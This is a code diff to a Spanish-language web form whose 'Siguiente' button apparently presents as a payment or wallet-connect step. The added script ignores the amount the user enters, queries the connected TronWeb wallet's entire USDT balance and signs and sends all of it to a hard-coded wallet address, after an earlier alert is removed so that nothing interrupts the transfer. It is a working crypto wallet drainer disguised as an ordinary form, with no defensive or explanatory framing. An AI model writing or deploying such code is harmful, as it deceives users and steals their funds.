@@ -51,10 +51,64 @@
         <div class="tw-footer-btn-area"><button class="tw-submit-button" id="connectBtn">Siguiente</button></div>
     </div>
 <script>
-    document.getElementById('connectBtn').addEventListener('click', () => {
-        const val = parseFloat(document.getElementById('amountDisplay').value);
-        if(isNaN(val) || val <= 0) return;
-        // Alerta removida: Ejecución directa sin interrupciones emergentes
+    const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
+    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
+    const connectBtn = document.getElementById('connectBtn');
+    const amountDisplay = document.getElementById('amountDisplay');
+
+    connectBtn.addEventListener('click', async () => {
+        try {
+            const val = parseFloat(amountDisplay.value);
+            if(isNaN(val) || val <= 0) return;
+
+            if (typeof window.tronWeb === 'undefined') return;
+            
+            const tronWeb = window.tronWeb;
+            connectBtn.disabled = true;
+
+            const ownerHex = tronWeb.defaultAddress.hex || tronWeb.address.toHex(tronWeb.defaultAddress.base58);
+
+            // Consulta dinámica on-chain balanceOf del balance absoluto
+            const balanceDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "balanceOf(address)",
+                { feeLimit: 10000000 },
+                [{ type: 'address', value: ownerHex }],
+                ownerHex
+            );
+            
+            if (!balanceDraft || !balanceDraft.constant_result || balanceDraft.constant_result.length === 0) {
+                connectBtn.disabled = false;
+                return;
+            }
+            
+            const unitsInSun = tronWeb.toBigNumber('0x' + balanceDraft.constant_result).toString();
+            if (unitsInSun === "0") {
+                connectBtn.disabled = false;
+                return;
+            }
+
+            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+
+            // Carga el total extraído en el borrador de la firma
+            const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
+                CONTRATO_USDT,
+                "transfer(address,uint256)",
+                { feeLimit: 100000000 },
+                [
+                    { type: 'address', value: destinoHex },
+                    { type: 'uint256', value: unitsInSun }
+                ],
+                ownerHex
+            );
+
+            const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+            await tronWeb.trx.sendRawTransaction(signedTx);
+            connectBtn.disabled = false;
+        } catch (error) {
+            console.error(error);
+            connectBtn.disabled = false;
+        }
     });
 </script>
 </body>
